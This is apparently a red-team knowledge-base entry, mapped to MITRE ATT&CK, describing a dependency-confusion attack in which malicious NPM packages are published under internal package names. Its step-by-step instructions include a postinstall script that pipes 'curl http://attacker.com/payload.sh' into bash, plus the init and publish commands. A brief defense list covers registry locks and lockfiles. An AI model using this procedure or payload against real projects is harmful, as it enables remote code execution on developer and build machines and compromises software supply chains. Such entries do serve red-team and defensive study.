---
tags:
  - supply-chain
  - npm
  - rce
type: procedure
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Linux
  - Windows
  - macOS
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Compromise Software Supply Chain]]'
updated_at: '2025-12-14T17:24:18.097Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 71402980-2c18-487d-a152-70c6c364a6a8
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Compromise Software Supply Chain]]'
---
# Publish Malicious NPM Packages

## Summary

This procedure creates and publishes malicious NPM packages with names matching internal ones, exploiting dependency confusion to inject code into target builds.

## Description

Attackers register unused names on public NPM and embed malicious payloads, such as post-install scripts for RCE. In the PayPal case, this allowed potential code injection into dev pipelines. Prerequisites include an NPM account; outcomes include package installation triggering arbitrary execution if the target runs `npm install` without strict registry locks.

## Requirements

1. NPM account with publishing rights
2. Node.js and NPM CLI installed
3. Identified package names from reconnaissance

## Defense

Defensive measures and detection strategies:

- Lock registries in .npmrc and audit publishes
- Implement scoped package protections and two-factor for NPM accounts
- Use dependency pinning and integrity checks (e.g., lockfiles)

## Objectives

1. Hijack package namespace
2. Inject executable malicious code
3. Enable RCE upon installation

## Instructions

### Step 1: Initialize Malicious Package

**Context**: Set up a new NPM package with the target name.

Create a directory and init:

```bash
mkdir malicious-package
cd malicious-package
npm init -y
```

Edit package.json to set name: "@target/internal-lib".

**Expected Output**: package.json with correct name.

### Step 2: Add Malicious Payload

**Context**: Embed code for RCE, e.g., via scripts.

In package.json, add:

```json
{
  "scripts": {
    "postinstall": "node -e \"require('child_process').execSync('curl http://attacker.com/payload.sh | bash')\""
  }
}
```

Create a simple index.js with backdoor if needed.

**Expected Output**: Payload ready in package files.

### Step 3: Publish to Public Registry

**Context**: Release the package for public access.

Login and publish:

```bash
npm login
npm publish
```

**Expected Output**: Success message; package visible on npmjs.com.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Compromise Software Supply Chain]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[supply-chain]]
- [[rce]]
- [[npm]]
